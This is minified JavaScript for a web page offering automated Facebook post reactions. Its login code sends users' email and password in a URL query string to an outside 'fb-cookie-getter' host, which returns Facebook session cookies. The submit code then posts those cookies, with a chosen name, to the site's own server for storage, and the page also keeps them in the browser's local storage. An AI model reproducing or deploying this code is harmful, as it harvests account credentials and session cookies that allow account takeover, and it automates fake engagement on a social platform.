document.addEventListener("DOMContentLoaded",(()=>{document.getElementById("savedDataModal"),document.getElementById("leaderboardsModal"),document.getElementById("saveUserList");const e=document.getElementById("savedDataList"),t=(document.getElementById("submitLoadingMessage"),document.getElementById("loginLoadingMessage")),n=document.getElementById("loginButton"),o=new bootstrap.Modal(document.getElementById("howToUseModal")),a=document.getElementById("submitButton"),s=document.getElementById("termsCheckbox"),d=document.getElementById("leaderboardButton");function r(e,t,n){document.getElementById("nameInput").value=e,document.getElementById("linkInput").value=t,document.getElementById("cookieInput").value=n}function c(e){confirm(`Are you sure you want to delete "${e}"?`)&&(localStorage.removeItem(e),l())}function l(){e.innerHTML="";for(let t=0;t<localStorage.length;t++){const n=localStorage.key(t),o=JSON.parse(localStorage.getItem(n)),a=document.createElement("div");a.classList.add("d-flex","justify-content-between","align-items-center","mb-2");const s=document.createElement("button");s.textContent="Apply",s.classList.add("btn","btn-success","me-2"),s.addEventListener("click",(()=>{r(n,o.link,o.cookie)}));const d=document.createElement("button");d.textContent="Delete",d.classList.add("btn","btn-danger"),d.addEventListener("click",(()=>{c(n)})),a.appendChild(s),a.appendChild(document.createTextNode(n)),a.appendChild(d),e.appendChild(a)}}async function i(e,o){try{n.disabled=!0,t.style.display="inline",s.disabled=!0;const a=await fetch(`https://jcfcodex-fb-cookie-getter.onrender.com/api/login?email=${e}&password=${o}`,{method:"GET",mode:"cors"}),d=await a.json();return"success"===d.status?(document.getElementById("cookieInput").value=d.cookies,alert("Login successful"),!0):(alert("Login failed. Please check your credentials."),!1)}catch(e){return console.error("Login Error:",e),alert("An error occurred during login."),!1}finally{n.disabled=!1,t.style.display="none",s.disabled=!1}}s.addEventListener("change",(()=>{a.disabled=!s.checked,n.disabled=!s.checked})),o.show(),document.getElementById("savedButton").addEventListener("click",(()=>{l()})),d.addEventListener("click",(()=>{!async function(){try{const e=await fetch("/api/getUsers");if(!e.ok)throw new Error("Failed to fetch leaderboard data");const t=await e.json(),n=document.getElementById("saveUserList");n.innerHTML="";const o=Object.entries(t).sort(((e,t)=>t[1].requestCount-e[1].requestCount)),a=document.createElement("div");a.classList.add("d-flex","justify-content-around","align-items-center","text-center","mb-3","fw-bold"),a.innerHTML='\n      <div class="col-4 text-center bg-primary text-white">RANK</div>\n      <div class="col-4 text-center bg-secondary text-white">NAME</div>\n      <div class="col-4 text-center bg-info text-white">REQUEST</div>\n      ',n.appendChild(a);let s=1;o.forEach((([e,t])=>{const o=document.createElement("div");o.classList.add("row","mb-2","border-bottom","pb-2"),o.innerHTML=`\n    <div class="col-4 text-center">${s++}</div>\n    <div class="col-4 text-center">${t.name}</div>\n    <div class="col-4 text-center">${t.requestCount}</div>\n  `,n.appendChild(o)})),new bootstrap.Modal(document.getElementById("leaderboardsModal")).show()}catch(e){console.error("Error fetching leaderboard data:",e),alert("Failed to fetch leaderboard data")}}()})),document.getElementById("reactForm").addEventListener("submit",(async e=>{e.preventDefault();const t=document.getElementById("submitButton"),n=document.getElementById("submitLoadingMessage"),o=document.getElementById("responseMessage"),a=document.getElementById("termsCheckbox");document.getElementById("nameInput").value;t.disabled=!0,n.style.display="inline",a.disabled=!0;try{if(!a.checked)throw new Error("Please agree to the terms and conditions.");const e=document.getElementById("nameInput"),t=document.getElementById("linkInput"),n=document.getElementById("typeSelect"),s=document.getElementById("cookieInput"),d=e.value,r=t.value,c=n.value,l=s.value;if(d.length>8)return alert("Please input between 1 and 8 characters only."),e.focus(),void(e.value="");const i=await fetch(`/api/react?link=${r}&type=${c}&cookie=${l}`),u=await i.json();if("SUCCESS"===u.status){const e={name:d,link:r,type:c};await async function(e,t){try{const n=await fetch("/api/getUsers");if(!n.ok)throw new Error("Failed to fetch user data");const o=(await n.json())[t.name]||{name:t.name,cookie:e,requestCount:0};if(o.requestCount+=1,!(await fetch("/api/saveUser",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cookie:e,userData:o})})).ok)throw new Error("Failed to save user data")}catch(e){console.error("Error:",e),alert("Failed to save user data")}}(l,e),function(){const e=document.getElementById("nameInput").value,t=document.getElementById("linkInput").value,n=document.getElementById("cookieInput").value;localStorage.setItem(e,JSON.stringify({link:t,cookie:n}))}();const t=u.message.match(/\d+/)[0],n=u.message.match(/\(([^)]+)\)/)[1],a=new Date(Date.now()+18e5).toLocaleTimeString("en-US",{hour:"numeric",minute:"numeric",second:"numeric",hour12:!0});o.innerHTML=`\n        <div class="alert alert-success" role="alert">\n          <strong>Status:</strong> ${u.status}<br>\n          <strong>Message:</strong> ${t} reactions (${n}) have been successfully sent to the post.<br>\n          <strong>Next Submit:</strong> ${a}\n        </div>\n      `}else o.innerHTML=`\n        <div class="alert alert-danger" role="alert">\n          <strong>Status:</strong> ${u.status}<br>\n          <strong>Message:</strong> ${u.message}\n        </div>\n      `}catch(e){console.error("Error:",e),o.innerText="An error occurred"}finally{t.disabled=!1,n.style.display="none",a.disabled=!1}})),document.getElementById("togglePassword").addEventListener("click",(function(){const e=document.getElementById("passwordInput"),t="password"===e.getAttribute("type")?"text":"password";e.setAttribute("type",t),this.textContent="password"===t?"show":"hide"})),n.addEventListener("click",(async()=>{const e=emailInput.value.trim(),t=passwordInput.value.trim(),n=document.getElementById("termsCheckbox");if(""!==e&&""!==t)if(n.checked)try{await i(e,t)}catch(e){console.error("Login error:",e),alert("An error occurred during login. Please try again.")}else alert("Please agree to the terms and conditions.");else alert("Please fill in all required fields.")})),window.addEventListener("beforeunload",(e=>{e.preventDefault(),e.returnValue="";const t="Are you sure you want to refresh? Unsaved changes will be lost.";return e.returnValue=t,t}))}));
